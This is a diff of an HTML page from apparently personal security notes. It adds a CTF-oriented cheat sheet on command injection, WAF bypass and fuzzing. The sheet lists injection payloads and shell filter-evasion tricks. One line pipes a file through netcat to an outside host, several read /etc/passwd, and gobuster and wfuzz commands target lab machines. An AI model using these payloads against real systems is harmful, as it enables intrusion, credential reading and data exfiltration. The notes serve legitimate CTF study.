@@ -103,7 +103,7 @@
     <div class="Page__header">
         <h1><a href="../Misc_Attack_Vector_Knowledge/Command_Injection_WAF_Bypass_Fuzzing.html">Misc Attack Vector Knowledge</a> <svg class="Page__header--separator" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 477.175 477.175"><path d="M360.73 229.075l-225.1-225.1c-5.3-5.3-13.8-5.3-19.1 0s-5.3 13.8 0 19.1l215.5 215.5-215.5 215.5c-5.3 5.3-5.3 13.8 0 19.1 2.6 2.6 6.1 4 9.5 4 3.4 0 6.9-1.3 9.5-4l225.1-225.1c5.3-5.2 5.3-13.8.1-19z"/></svg> <a href="../Misc_Attack_Vector_Knowledge/Command_Injection_WAF_Bypass_Fuzzing.html">Command Injection & WAF Bypass & Fuzzing</a></h1>
                 <span class="ModifiedDate">
-            February 16, 2021 at 12:17 AM        </span>
+            February 16, 2021 at 12:19 AM        </span>
                         <span class="EditOn">
             <a href="https://github.com/WildfootW/Security-Note/blob/master/docs/020_Misc_Attack_Vector_Knowledge/010_Command_Injection_&_WAF_Bypass_&_Fuzzing.md" target="_blank">
                 Edit on GitHub            </a>
@@ -111,7 +111,264 @@
             </div>
 
     <div class="s-content">
-            </div>
+        <h1 id="page_Command_Injection_WAF_bypass_Fuzzing">Command Injection &amp; WAF bypass &amp; Fuzzing</h1>
+<div class="TableOfContentsContainer">
+    <h4 class="TableOfContentsContainer__title">Table of Contents</h4>
+    <div class="TableOfContentsContainer__content">
+        <ul class="TableOfContents">
+<li>
+<p><a href="#page_Command_Injection_WAF_bypass_Fuzzing">Command Injection &amp; WAF bypass &amp; Fuzzing</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_tags">tags: <code>Security</code> <code>Fuzzing</code></a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Command_Injection">Command Injection</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Cheatsheet">Cheatsheet</a></p>
+</li>
+<li>
+<p><a href="#page_keywords">keywords</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Regular_expression">Regular expression</a></p>
+</li>
+<li>
+<p><a href="#page_String_Concat">String Concat</a></p>
+</li>
+<li>
+<p><a href="#page_Empty_Variable">Empty Variable</a></p>
+</li>
+<li>
+<p><a href="#page_Environment_Variable">Environment Variable</a></p>
+</li>
+<li>
+<p><a href="#page_String_operating">String operating</a></p>
+</li>
+<li>
+<p><a href="#page_Backslash">Backslash</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_space_characters">&lt;space&gt; characters</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_section_13"><code>${IFS}</code></a></p>
+</li>
+<li>
+<p><a href="#page_Redirecting">Redirecting</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_bash">bash</a></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_WAF_bypass_Fuzz">WAF bypass &amp; Fuzz</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Enum_path">Enum path</a></p>
+</li>
+<li>
+<p><a href="#page_Enum_option">Enum option</a></p>
+</li>
+<li>
+<p><a href="#page_Enum_bad_char">Enum bad char</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Example">Example</a></p>
+</li>
+</ul>    </div>
+</div>
+<h6 id="page_tags">tags: <code>Security</code> <code>Fuzzing</code></h6>
+<pre><code>&amp; ; - ` | $
+</code></pre>
+<h1 id="page_Command_Injection">Command Injection</h1>
+<h2 id="page_Cheatsheet">Cheatsheet</h2>
+<p><a href="https://github.com/payloadbox/command-injection-payload-list" class="Link--external" rel="noopener noreferrer">GitHub - payloadbox</a></p>
+<pre><code>| cat flag
+&amp;&amp; cat flag
+; cat flag
+%0a cat flag
+&quot;; cat flag
+`cat flag`
+cat $(ls)
+&quot;; cat $(ls)
+`cat flag | nc wildfoo.tw 7778`
+
+. flag
+PS1=$(cat flag)
+
+`echo${IFS}${PATH}|cut${IFS}-c1-1`
+=&gt; /
+</code></pre>
+<h2 id="page_keywords">keywords</h2>
+<h3 id="page_Regular_expression">Regular expression</h3>
+<ul>
+<li>
+<code>?</code> match one character
+<ul>
+<li>
+<code>cat fl?g</code>
+</li>
+<li>
+<code>/???/??t /???/p??s??</code>
+</li>
+</ul>
+</li>
+<li>
+<code>*</code> match multiple characters
+<ul>
+<li>
+<code>cat f*</code>
+</li>
+<li>
+<code>cat f?a*</code>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="page_String_Concat">String Concat</h3>
+<ul>
+<li>
+<code>A=fl;B=ag;cat $A$B</code>
+</li>
+</ul>
+<h3 id="page_Empty_Variable">Empty Variable</h3>
+<ul>
+<li>
+<code>cat fl${x}ag</code>
+</li>
+<li>
+<code>cat tes$(z)t/flag</code>
+</li>
+</ul>
+<h3 id="page_Environment_Variable">Environment Variable</h3>
+<p>use <code>env</code> to print out environment variables</p>
+<ul>
+<li>
+<code>$PATH =&gt; &quot;/usr/local/….blablabla”</code>
+<ul>
+<li>
+<code>${PATH:0:1}   =&gt; '/'</code>
+</li>
+<li>
+<code>${PATH:1:1}   =&gt; 'u'</code>
+</li>
+<li>
+<code>${PATH:0:4}   =&gt; '/usr'</code>
+</li>
+</ul>
+</li>
+<li>
+<code>${PS2}</code>
+<ul>
+<li>
+<code>&gt;</code>
+</li>
+</ul>
+</li>
+<li>
+<code>${PS4}</code>
+<ul>
+<li>
+<code>+</code>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="page_String_operating">String operating</h3>
+<ul>
+<li>Empty String
+<ul>
+<li>
+<code>cat fl&quot;&quot;ag</code>
+</li>
+<li>
+<code>cat fl''ag</code>
+</li>
+</ul>
+</li>
+<li>
+<code>cat &quot;fl&quot;&quot;ag&quot;</code>
+</li>
+</ul>
+<h3 id="page_Backslash">Backslash</h3>
+<ul>
+<li>
+<code>c\at fl\ag</code>
+</li>
+</ul>
+<h2 id="page_space_characters">&lt;space&gt; characters</h2>
+<h3 id="page_section_13"><code>${IFS}</code></h3>
+<ul>
+<li>
+<code>cat${IFS}flag</code>
+</li>
+<li>
+<code>ls$IFS-alh</code>
+</li>
+<li>
+<code>cat$IFS$2flag</code>
+</li>
+</ul>
+<h3 id="page_Redirecting">Redirecting</h3>
+<ul>
+<li>
+<code>cat&lt;/etc/passwd</code>
+</li>
+</ul>
+<h4 id="page_bash">bash</h4>
+<ul>
+<li>
+<code>{cat,/etc/passwd}</code>
+</li>
+<li>
+<code>X=$'cat\x20/etc/passwd'&amp;&amp;$X</code>
+</li>
+<li>
+<code>IFS=,;`cat&lt;&lt;&lt;uname,-a`</code>
+</li>
+</ul>
+<h1 id="page_WAF_bypass_Fuzz">WAF bypass &amp; Fuzz</h1>
+<h3 id="page_Enum_path">Enum path</h3>
+<ul>
+<li>
+<code>gobuster -u http://fluxcapacitor.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code>
+</li>
+</ul>
+<h3 id="page_Enum_option">Enum option</h3>
+<ul>
+<li>
+<code>wfuzz --hh BBB -H &quot;User-Agent:alamot&quot; -c -z file,/usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt http://10.10.10.69/sync/?FUZZ{not_this}=test</code>
+</li>
+<li>
+<code>wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H &quot;User-Agent: nothingtoseehere&quot; --hh=19 &quot;http://fluxcapacitor.htb/sync?FUZZ=test&quot;</code>
+https://bitvijays.github.io/LFC-VulnerableMachines.html#parameter-fuzz</li>
+</ul>
+<h3 id="page_Enum_bad_char">Enum bad char</h3>
+<ul>
+<li>
+<code>wfuzz -c -w /usr/share/wordlists/SecLists/Fuzzing/special_chars.txt -u http://10.10.10.69/sync?opt=FUZZ</code>
+</li>
+</ul>
+<h1 id="page_Example">Example</h1>
+<pre><code>opt=' pw''d'
+opt=' whi''ch cu''rl'
+opt=' /usr/bin/whi[c]h mk\nod'
+opt=' p\s aux'
+</code></pre>
+    </div>
 
         <nav>
         <ul class="Pager">
